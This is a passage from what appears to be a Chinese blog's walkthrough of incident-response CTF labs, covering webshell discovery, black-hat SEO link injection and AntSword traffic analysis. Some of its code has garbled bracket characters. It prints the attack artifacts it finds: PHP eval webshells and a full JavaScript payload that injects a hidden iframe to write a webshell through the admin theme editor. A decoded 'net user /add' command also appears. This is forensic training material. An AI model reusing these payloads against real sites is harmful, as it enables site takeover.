</span></span><span style=display:flex><span>mysql&gt; <span style=color:#66d9ef>select</span> * from x2_user;
</span></span><span style=display:flex><span>+--------+------------+-------------+-----------------+----------------+----------------------------------+----------+----------------+-------------+-------------+----------------+-------------+--------------+------------+------------------------------------------------------------------------------------------------------------------------------+--------------------+--------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+-------------+------------+-----------+-------------+---------------------------------------------------------+------------+------------+
</span></span><span style=display:flex><span>| userid | useropenid | userunionid | username        | useremail      | userpassword                     | usercoin | userregip      | userregtime | userlogtime | userverifytime | usergroupid | usermoduleid | useranswer | manager_apps                                                                                                                 | usertruename       | normal_favor | teacher_subjects                                                                                                                                                                             | userprofile | usergender | userphone | useraddress | userphoto                                               | userstatus | normal_sfz |
</span></span><span style=display:flex><span>+--------+------------+-------------+-----------------+----------------+----------------------------------+----------+----------------+-------------+-------------+----------------+-------------+--------------+------------+------------------------------------------------------------------------------------------------------------------------------+--------------------+--------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+-------------+------------+-----------+-------------+---------------------------------------------------------+------------+------------+
</span></span><span style=display:flex><span>|      <span style=color:#ae81ff>1</span> |            | NULL        | peadmin         | 958074@163.com | f6f6eb5ace977d7e114377cc7098b7e3 |      <span style=color:#ae81ff>279</span> | 127.0.0.1      |  <span style=color:#ae81ff>1471795200</span> |           <span style=color:#ae81ff>0</span> |           NULL |           <span style=color:#ae81ff>1</span> |            <span style=color:#ae81ff>0</span> | NULL       | a:7:<span style=color:#f92672>{</span>i:0;s:4:<span style=color:#e6db74>&#34;user&#34;</span>;i:1;s:7:<span style=color:#e6db74>&#34;content&#34;</span>;i:2;s:4:<span style=color:#e6db74>&#34;exam&#34;</span>;i:3;s:8:<span style=color:#e6db74>&#34;document&#34;</span>;i:4;s:6:<span style=color:#e6db74>&#34;course&#34;</span>;i:5;s:4:<span style=color:#e6db74>&#34;bank&#34;</span>;i:6;s:8:<span style=color:#e6db74>&#34;autoform&#34;</span>;<span style=color:#f92672>}</span> | <span style=color:#ae81ff>111111111111111111</span> |              |                                                                                                                                                                                              |             | 男         |           | 信息部      | files/attach/images/content/20230802/16909740072788.jpg |          <span style=color:#ae81ff>3</span> |            |
</span></span><span style=display:flex><span>|      <span style=color:#ae81ff>2</span> |            | NULL        | 教师管理员      | 958074@126.com | 96e79218965eb72c92a549dd5a330112 |       <span style=color:#ae81ff>98</span> | 127.0.0.1      |  <span style=color:#ae81ff>1471795200</span> |           <span style=color:#ae81ff>0</span> |           NULL |           <span style=color:#ae81ff>9</span> |            <span style=color:#ae81ff>0</span> | NULL       |                                                                                                                              | <span style=color:#ae81ff>213123</span>             |              | a:14:<span style=color:#f92672>{</span>i:0;s:2:<span style=color:#e6db74>&#34;13&#34;</span>;i:1;s:2:<span style=color:#e6db74>&#34;12&#34;</span>;i:2;s:1:<span style=color:#e6db74>&#34;5&#34;</span>;i:3;s:1:<span style=color:#e6db74>&#34;4&#34;</span>;i:4;s:1:<span style=color:#e6db74>&#34;3&#34;</span>;i:5;s:1:<span style=color:#e6db74>&#34;1&#34;</span>;i:6;s:1:<span style=color:#e6db74>&#34;2&#34;</span>;i:7;s:2:<span style=color:#e6db74>&#34;17&#34;</span>;i:8;s:2:<span style=color:#e6db74>&#34;15&#34;</span>;i:9;s:2:<span style=color:#e6db74>&#34;16&#34;</span>;i:10;s:2:<span style=color:#e6db74>&#34;18&#34;</span>;i:11;s:2:<span style=color:#e6db74>&#34;19&#34;</span>;i:12;s:2:<span style=color:#e6db74>&#34;20&#34;</span>;i:13;s:2:<span style=color:#e6db74>&#34;21&#34;</span>;<span style=color:#f92672>}</span> | <span style=color:#ae81ff>77777</span>       |            |           |             |                                                         |          <span style=color:#ae81ff>3</span> |            |
</span></span><span style=display:flex><span>|      <span style=color:#ae81ff>3</span> |            |             | zgsf            | zgsf@Admin.com | af0c68603004a1b5af4d87a71a813057 |        <span style=color:#ae81ff>0</span> | 192.168.20.131 |  <span style=color:#ae81ff>1709795218</span> |           <span style=color:#ae81ff>0</span> |              <span style=color:#ae81ff>0</span> |           <span style=color:#ae81ff>8</span> |            <span style=color:#ae81ff>0</span> |            |                                                                                                                              |                    |              |                                                                                                                                                                                              |             |            |           |             |                                                         |          <span style=color:#ae81ff>0</span> |            |
</span></span><span style=display:flex><span>|      <span style=color:#ae81ff>4</span> |            |             | zgsfAdmin       | zgsf@zgsf.com  | ed2b3e3ce2425550d8bfdea8b80cc89a |        <span style=color:#ae81ff>0</span> | 192.168.20.131 |  <span style=color:#ae81ff>1709796233</span> |           <span style=color:#ae81ff>0</span> |              <span style=color:#ae81ff>0</span> |           <span style=color:#ae81ff>8</span> |            <span style=color:#ae81ff>0</span> |            |                                                                                                                              |                    |              |                                                                                                                                                                                              |             |            |           |             |                                                         |          <span style=color:#ae81ff>0</span> |            |
</span></span><span style=display:flex><span>+--------+------------+-------------+-----------------+----------------+----------------------------------+----------+----------------+-------------+-------------+----------------+-------------+--------------+------------+------------------------------------------------------------------------------------------------------------------------------+--------------------+--------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+-------------+------------+-----------+-------------+---------------------------------------------------------+------------+------------+
</span></span><span style=display:flex><span><span style=color:#ae81ff>4</span> rows in set <span style=color:#f92672>(</span>0.00 sec<span style=color:#f92672>)</span>
</span></span></code></pre></div><pre tabindex=0><code>f6f6eb5ace977d7e114377cc7098b7e3 
flag{Network@2020}
</code></pre><h2 id=q3-10>Q3</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>通过本地 PC SSH到服务器并且分析黑客第一次Webshell的连接URL为多少,将黑客第一次Webshell的连接URL作为 FLAG 提交(无需域名flag{xxx.php?abc-app-upload});
</span></span></code></pre></div><p>把流量包下载下来看一下，前面都是这个路由</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>flag{index.php?user-app-register}
</span></span></code></pre></div><h2 id=q4-10>Q4</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>通过本地 PC SSH到服务器并且分析黑客Webshell连接密码多少,将黑客Webshell连接密码 作为 FLAG 提交;
</span></span></code></pre></div><p><img alt=2025-03-09131415 loading=lazy src=/posts/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%8E%84%E6%9C%BA/2025-03-09131415.png></p><p>先看到了这个，没啥用</p><p>分析一下，对于上题的url进行tcp追踪开头就是答案</p><pre tabindex=0><code>flag{Network2020}
</code></pre><h2 id=q5-8>Q5</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>通过本地 PC SSH到服务器并且分析黑客使用的后续上传的木马文件名称为多少,将黑客使用的后续上传的木马文件名称 作为 FLAG 提交;
</span></span></code></pre></div><p><img alt=2025-03-09131731 loading=lazy src=/posts/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%8E%84%E6%9C%BA/2025-03-09131731.png></p><p>后面都是这个路由了</p><pre tabindex=0><code>flag{version2.php}
</code></pre><h2 id=q6-1>Q6</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>通过本地 PC SSH到服务器并且分析黑客隐藏的flag2,将黑客使隐藏的flag2 作为 FLAG 提交;
</span></span></code></pre></div><p>先写出来的q7，可以看到历史记录，按照流程跟踪到这</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>[</span>root@ip-10-0-10-1 .api<span style=color:#f92672>]</span><span style=color:#75715e># cat alinotify.php</span>
</span></span><span style=display:flex><span>&lt;?php
</span></span><span style=display:flex><span>namespace PHPEMS;
</span></span><span style=display:flex><span>/*
</span></span><span style=display:flex><span> * Created on 2013-12-26
</span></span><span style=display:flex><span> *
</span></span><span style=display:flex><span> * To change the template <span style=color:#66d9ef>for</span> this generated file go to
</span></span><span style=display:flex><span> * Window - Preferences - PHPeclipse - PHP - Code Templates
</span></span><span style=display:flex><span> */
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>define<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;PEPATH&#39;</span>,dirname<span style=color:#f92672>(</span>dirname<span style=color:#f92672>(</span>__FILE__<span style=color:#f92672>)))</span>;
</span></span><span style=display:flex><span>class app
</span></span><span style=display:flex><span><span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        public $G;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        public <span style=color:#66d9ef>function</span> __construct<span style=color:#f92672>()</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                $this-&gt;ev <span style=color:#f92672>=</span> <span style=color:#ae81ff>\P</span>HPEMS<span style=color:#ae81ff>\g</span>inkgo::make<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;ev&#39;</span><span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>                $this-&gt;order <span style=color:#f92672>=</span> <span style=color:#ae81ff>\P</span>HPEMS<span style=color:#ae81ff>\g</span>inkgo::make<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;orders&#39;</span>,<span style=color:#e6db74>&#39;bank&#39;</span><span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        public <span style=color:#66d9ef>function</span> run<span style=color:#f92672>()</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>                $alipay <span style=color:#f92672>=</span> <span style=color:#ae81ff>\P</span>HPEMS<span style=color:#ae81ff>\g</span>inkgo::make<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;alipay&#39;</span><span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>                $orderid <span style=color:#f92672>=</span> $this-&gt;ev-&gt;get<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;out_trade_no&#39;</span><span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>                $order <span style=color:#f92672>=</span> $this-&gt;order-&gt;getOrderById<span style=color:#f92672>(</span>$orderid<span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>                $verify_result <span style=color:#f92672>=</span> $alipay-&gt;alinotify<span style=color:#f92672>()</span>;
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>if</span><span style=color:#f92672>(</span>$verify_result<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>                <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>                        <span style=color:#66d9ef>if</span><span style=color:#f92672>(</span>$this-&gt;ev-&gt;get<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;trade_status&#39;</span><span style=color:#f92672>)</span> <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;TRADE_FINISHED&#39;</span> <span style=color:#f92672>||</span>$this-&gt;ev-&gt;get<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;trade_status&#39;</span><span style=color:#f92672>)</span> <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;TRADE_SUCCESS&#39;</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>                        <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>                                <span style=color:#66d9ef>if</span><span style=color:#f92672>(</span>$order<span style=color:#f92672>[</span><span style=color:#e6db74>&#39;orderstatus&#39;</span><span style=color:#f92672>]</span> !<span style=color:#f92672>=</span> 2<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>                                <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>                    $this-&gt;order-&gt;payforOrder<span style=color:#f92672>(</span>$orderid,<span style=color:#e6db74>&#39;alipay&#39;</span><span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>                                <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>                                exit<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;sucess&#39;</span><span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>                        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>                        elseif<span style=color:#f92672>(</span>$_POST<span style=color:#f92672>[</span><span style=color:#e6db74>&#39;trade_status&#39;</span><span style=color:#f92672>]</span> <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;WAIT_BUYER_PAY&#39;</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>                        <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>                                exit<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;fail&#39;</span><span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>                        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>                        <span style=color:#66d9ef>else</span>
</span></span><span style=display:flex><span>                        <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>                                exit<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;fail&#39;</span><span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>                        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>                <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>else</span>
</span></span><span style=display:flex><span>                <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>                        exit<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;fail&#39;</span><span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>                <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>include PEPATH.<span style=color:#e6db74>&#39;/lib/init.cls.php&#39;</span>;
</span></span><span style=display:flex><span>$app <span style=color:#f92672>=</span> new app<span style=color:#f92672>(</span>new ginkgo<span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>$app-&gt;run<span style=color:#f92672>()</span>;
</span></span><span style=display:flex><span>$flag2 <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;flag{bL5Frin6JVwVw7tJBdqXlHCMVpAenXI9In9}&#34;</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>?&gt;
</span></span></code></pre></div><h2 id=q7-1>Q7</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>通过本地 PC SSH到服务器并且分析黑客隐藏的flag3,将黑客使隐藏的flag3 作为 FLAG 提交;
</span></span></code></pre></div><p>用history可以得到</p><p><img alt=2025-03-09131913 loading=lazy src=/posts/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%8E%84%E6%9C%BA/2025-03-09131913.png></p><p>或者</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>[</span>root@ip-10-0-10-1 ~<span style=color:#f92672>]</span><span style=color:#75715e># find ./ -type f -exec grep &#34;flag{&#34; {} +</span>
</span></span><span style=display:flex><span>./.bash_history:$flag3 <span style=color:#f92672>=</span> flag<span style=color:#f92672>{</span>5LourqoFt5d2zyOVUoVPJbOmeVmoKgcy6OZ<span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>Binary file ./wp matches
</span></span></code></pre></div><h1 id=第五章-linux实战-黑链>第五章 linux实战-黑链</h1><p><strong>黑链（Black Hat SEO Links）</strong> 是指通过不正当手段在网页中植入隐藏的、非法的或恶意的链接，通常用于操纵搜索引擎排名或传播恶意内容。黑链是黑帽 SEO（Black Hat SEO）的一种常见手段，违反了搜索引擎的规则和道德准则</p><h2 id=q1-11>Q1</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>找到黑链添加在哪个文件 flag 格式 flag{xxx.xxx}
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@ip-10-0-10-3:~# grep -rnw <span style=color:#e6db74>&#39;/var/www/html/&#39;</span> -e <span style=color:#e6db74>&#39;黑链&#39;</span>
</span></span><span style=display:flex><span>/var/www/html/usr/themes/default/header.php:24:&lt;h3 style<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;text-align:center&#34;</span>&gt;模拟黑链&lt;/h3&gt;
</span></span><span style=display:flex><span>Binary file /var/www/html/www.tar matches
</span></span></code></pre></div><p>在指定目录中递归搜索包含特定关键词</p><h2 id=q2-11>Q2</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>webshell的绝对路径 flag{xxxx/xxx/xxx/xxx/}
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>rootàip-10-0-10-3:/var/www/htmlù find . -name <span style=color:#e6db74>&#34;*.php&#34;</span> -type f -exec grep -Hn <span style=color:#e6db74>&#34;eval(&#34;</span> äü ç; 2&gt;/dev/null
</span></span><span style=display:flex><span>./usr/themes/default/404.php:2:&lt;?php àeval<span style=color:#f92672>(</span>$èPOSTéaê<span style=color:#f92672>)</span>; ?&gt;
</span></span><span style=display:flex><span>./usr/themes/default/404.php:3:&lt;?php àeval<span style=color:#f92672>(</span>$èPOSTéaê<span style=color:#f92672>)</span>; ?&gt;
</span></span><span style=display:flex><span>./usr/themes/default/404.php:4:&lt;?php àeval<span style=color:#f92672>(</span>$èPOSTéaê<span style=color:#f92672>)</span>; ?&gt;
</span></span><span style=display:flex><span>./usr/themes/default/404.php:5:&lt;?php àeval<span style=color:#f92672>(</span>$èPOSTéaê<span style=color:#f92672>)</span>; ?&gt;
</span></span><span style=display:flex><span>./usr/themes/default/404.php:6:&lt;?php àeval<span style=color:#f92672>(</span>$èPOSTéaê<span style=color:#f92672>)</span>; ?&gt;
</span></span><span style=display:flex><span>./usr/themes/default/404.php:7:&lt;?php àeval<span style=color:#f92672>(</span>$èPOSTéaê<span style=color:#f92672>)</span>; ?&gt;
</span></span><span style=display:flex><span>./var/Typecho/I18n/GetText.php:372:        eval<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;</span>$string<span style=color:#e6db74>&#34;</span><span style=color:#f92672>)</span>;
</span></span></code></pre></div><pre tabindex=0><code>flag{/var/www/html/usr/themes/default/404.php}
</code></pre><h2 id=q3-11>Q3</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>黑客注入黑链文件的 md5 md5sum file flag{md5}
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>rootàip-10-0-10-3:/var/www/htmlù cat poc1.js
</span></span><span style=display:flex><span>// 定义一个函数，在网页末尾插入一个iframe元素
</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> insertIframe<span style=color:#f92672>()</span> ä
</span></span><span style=display:flex><span>    // 获取当前页面路径
</span></span><span style=display:flex><span>    var urlWithoutDomain <span style=color:#f92672>=</span> window.location.pathname;
</span></span><span style=display:flex><span>    // 判断页面是否为评论管理页面
</span></span><span style=display:flex><span>    var hasManageComments <span style=color:#f92672>=</span> urlWithoutDomain.includes<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;manage-comments.php&#34;</span><span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>    var tSrc<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;&#39;</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>hasManageComments<span style=color:#f92672>)</span>ä
</span></span><span style=display:flex><span>        // 如果是，则将路径修改为用于修改主题文件的页面地址
</span></span><span style=display:flex><span>        tSrc<span style=color:#f92672>=</span>urlWithoutDomain.replace<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;manage-comments.php&#39;</span>,<span style=color:#e6db74>&#39;theme-editor.php?theme=default&amp;file=404.php&#39;</span><span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>    üelseä
</span></span><span style=display:flex><span>        // 如果不是，则直接使用主题文件修改页面地址
</span></span><span style=display:flex><span>        tSrc<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;/admin/theme-editor.php?theme=default&amp;file=404.php&#39;</span>;
</span></span><span style=display:flex><span>    ü
</span></span><span style=display:flex><span>    // 定义iframe元素的属性，包括id、src、width、height和onload事件
</span></span><span style=display:flex><span>    var iframeAttributes <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&lt;iframe id=&#39;themeèid&#39; src=&#39;&#34;</span>+tSrc+<span style=color:#e6db74>&#34;&#39; width=&#39;0%&#39; height=&#39;0%&#39; onload=&#39;writeShell()&#39;&gt;&lt;/iframe&gt;&#34;</span>;
</span></span><span style=display:flex><span>    // 获取网页原始内容
</span></span><span style=display:flex><span>    var originalContent <span style=color:#f92672>=</span> document.body.innerHTML;
</span></span><span style=display:flex><span>    // 在网页末尾添加iframe元素
</span></span><span style=display:flex><span>    document.body.innerHTML <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>originalContent + iframeAttributes<span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>ü
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>// 定义一个全局变量isSaved，初始值为false
</span></span><span style=display:flex><span>var isSaved <span style=color:#f92672>=</span> false;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>// 定义一个函数，在iframe中写入一段PHP代码并保存
</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> writeShell<span style=color:#f92672>()</span> ä
</span></span><span style=display:flex><span>    // 如果isSaved为false
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>!isSaved<span style=color:#f92672>)</span> ä 
</span></span><span style=display:flex><span>        // 获取iframe内的内容区域和“保存文件”按钮元素
</span></span><span style=display:flex><span>        var content <span style=color:#f92672>=</span> document.getElementById<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;themeèid&#39;</span><span style=color:#f92672>)</span>.contentWindow.document.getElementById<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;content&#39;</span><span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>        var btns <span style=color:#f92672>=</span> document.getElementById<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;themeèid&#39;</span><span style=color:#f92672>)</span>.contentWindow.document.getElementsByTagName<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;button&#39;</span><span style=color:#f92672>)</span>;    
</span></span><span style=display:flex><span>        // 获取模板文件原始内容
</span></span><span style=display:flex><span>        var oldData <span style=color:#f92672>=</span> content.value;
</span></span><span style=display:flex><span>        // 在原始内容前加入一段phpinfo代码
</span></span><span style=display:flex><span>        content.value <span style=color:#f92672>=</span> <span style=color:#f92672>(</span><span style=color:#e6db74>&#39;&lt;?php àeval($èPOSTéaê); ?&gt;çn&#39;</span><span style=color:#f92672>)</span> + oldData;
</span></span><span style=display:flex><span>        // 点击“保存文件”按钮
</span></span><span style=display:flex><span>        btnsé1ê.click<span style=color:#f92672>()</span>;
</span></span><span style=display:flex><span>        // 将isSaved设为true，表示已经完成写入操作
</span></span><span style=display:flex><span>        isSaved <span style=color:#f92672>=</span> true;
</span></span><span style=display:flex><span>    ü
</span></span><span style=display:flex><span>ü
</span></span><span style=display:flex><span>// 调用insertIframe函数，向网页中添加iframe元素和写入PHP���码的事件
</span></span><span style=display:flex><span>insertIframe<span style=color:#f92672>()</span>;rootàip-10-0-10-3:/var/www/htmlù md5sum poc1.js
</span></span><span style=display:flex><span>10c18029294fdec7b6ddab76d9367c14  poc1.js
</span></span></code></pre></div><h2 id=q4-11>Q4</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>攻击入口是哪里？url请求路径，最后面加/ flag{/xxxx.xxx/xxxx/x/}
</span></span></code></pre></div><p>下载流量包快速定位<code>http contains "poc1.js"</code>,进行简单的分析一下就有了(爆破fuzz一下也行（bushi</p><pre tabindex=0><code>flag{/index.php/archives/1/}
</code></pre><h1 id=第六章-流量特征分析-蚁剑流量分析>第六章 流量特征分析-蚁剑流量分析</h1><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>1.木马的连接密码是多少
</span></span><span style=display:flex><span>2.黑客执行的第一个命令是什么
</span></span><span style=display:flex><span>3.黑客读取了哪个文件的内容，提交文件绝对路径
</span></span><span style=display:flex><span>4.黑客上传了什么文件到服务器，提交文件名
</span></span><span style=display:flex><span>5.黑客上传的文件内容是什么
</span></span><span style=display:flex><span>6.黑客下载了哪个文件，提交文件绝对路径
</span></span></code></pre></div><p>可以先去先知了解一下蚁剑流量</p><h2 id=q1-12>Q1</h2><p>http过滤，tcp追踪，第一个开头就是flag</p><pre tabindex=0><code>flag{1}
</code></pre><h2 id=q2-12>Q2</h2><p><img alt=2025-03-09144418 loading=lazy src=/posts/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%8E%84%E6%9C%BA/2025-03-09144418.png></p><pre tabindex=0><code>flag{id}
</code></pre><h2 id=q3-12>Q3</h2><p>主要就是分析最后的base64编码，去掉开头两个字符</p><p><img alt=2025-03-09144706 loading=lazy src=/posts/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%8E%84%E6%9C%BA/2025-03-09144706.png></p><pre tabindex=0><code>flag{/etc/passwd}
</code></pre><h2 id=q4-12>Q4</h2><p><img alt=2025-03-09144751 loading=lazy src=/posts/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%8E%84%E6%9C%BA/2025-03-09144751.png></p><pre tabindex=0><code>flag{flag.txt}
</code></pre><h2 id=q5-9>Q5</h2><p>上面这条流量包全复制到厨子了，一眼666开头</p><p><img alt=2025-03-09144848 loading=lazy src=/posts/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%8E%84%E6%9C%BA/2025-03-09144848.png></p><h2 id=q6-2>Q6</h2><p>往下翻两条流量</p><p><img alt=2025-03-09144948 loading=lazy src=/posts/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%8E%84%E6%9C%BA/2025-03-09144948.png></p><h1 id=第六章-流量特征分析-蚂蚁爱上树>第六章 流量特征分析-蚂蚁爱上树</h1><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>应急响应小组成员老狼在 waf 上下载了一段流量，请你分析黑客攻击手法，并且解答下面问题
</span></span><span style=display:flex><span><span style=color:#66d9ef>1.</span> 管理员Admin账号的密码是什么？
</span></span><span style=display:flex><span><span style=color:#66d9ef>2.</span> LSASS.exe的程序进程ID是多少？
</span></span><span style=display:flex><span><span style=color:#66d9ef>3.</span> 用户WIN101的密码是什么?
</span></span></code></pre></div><h2 id=q1-13>Q1</h2><p>先搜索看看password没有，然后<code>http.request.method == "POST"</code></p><p>这里包大的都是<code>product2.php</code>再过滤一下</p><p><img alt=2025-03-09153059 loading=lazy src=/posts/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%8E%84%E6%9C%BA/2025-03-09153059.png></p><p>从前往后慢慢找，流程大约是在windows上创建了一个用户</p><pre tabindex=0><code>Y2QgL2QgIkM6XFxwaHBTdHVkeVxcUEhQVHV0b3JpYWxcXFdXV1xcb25saW5lc2hvcCImbmV0IHVzZXIgYWRtaW4gUGFzc3dvcmQxIC9hZGQmZWNobyBbU10mY2QmZWNobyBbRV0=
cd /d &#34;C:\\phpStudy\\PHPTutorial\\WWW\\onlineshop&#34;&amp;net user admin Password1 /add&amp;echo [S]&amp;cd&amp;echo [E]
</code></pre><pre tabindex=0><code>flag{password1}
</code></pre><h2 id=q2-13>Q2</h2><p>和上题流程基本一致,往下翻就是了</p><p><img alt=2025-03-09154748 loading=lazy src=/posts/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%8E%84%E6%9C%BA/2025-03-09154748.png></p><pre tabindex=0><code>flag{852}
</code></pre><p>这边引用perterpan师傅的分析流程</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>Rundll32.exe
</span></span><span style=display:flex><span>
